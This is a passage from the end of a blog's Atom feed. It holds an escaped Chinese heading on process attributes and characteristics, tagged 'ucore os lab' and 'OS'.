&lt;h2 id=&quot;进程的属性与特征解析&quot;&gt;&lt;a href=&quot;#进程的属性与特征解析&quot; class=&quot;headerlink&quot; title=&quot;进程的属性与特征解析&quot;&gt;&lt;/a&gt;进程的属性与特征解析&lt;/h2&gt;</summary>
    
    
    
    
    <category term="ucore os lab" scheme="http://hhdx.xyz/tags/ucore-os-lab/"/>
    
    <category term="OS" scheme="http://hhdx.xyz/tags/OS/"/>
    
  </entry>
  
</feed>
